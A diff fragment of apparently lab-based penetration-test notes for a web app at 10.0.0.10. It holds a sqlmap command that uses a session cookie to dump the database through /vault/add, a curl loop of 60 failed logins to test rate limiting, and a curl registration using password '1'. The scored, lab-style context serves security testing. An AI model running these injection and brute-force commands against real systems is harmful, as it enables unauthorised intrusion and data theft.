@@ -34,3 +34,28 @@ sqlmap -u "http://10.0.0.10/vault/add" \
   --cookie="connect.sid=s%3AdR3xsr6cihqDBYCreaF3wSfhTeWKqruZ.AWPS0%2B%2BPoZTxR788rPPZc2ucZ5400oYsPYME9JHFOEA" \
   --batch --level=5 --risk=3 \
   --dump --delay=1
+
+
+
+
+Quick verification commands:
+
+Security Headers:
+
+curl -I http://10.0.0.10
+Check for missing: X-Frame-Options, X-Content-Type-Options, CSP, HSTS.
+
+Weak Passwords: Register with password "1" via curl/JS, confirm accepted.
+
+Rate Limiting:
+
+for i in {1..60}; do curl -X POST http://10.0.0.10/login -H "Content-Type: application/json" -d '{"username":"test","password":"wrong"}'; done
+Check if >50 requests succeed.
+
+HTTPS: Confirm URL is http://, not https:// (cleartext submission).
+
+All confirmed as medium/low weaknesses, no points. If new findings, report. Otherwise, pentest complete at 75 points.
+
+curl -X POST http://10.0.0.10/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"weakpassuser123","password":"1"}'
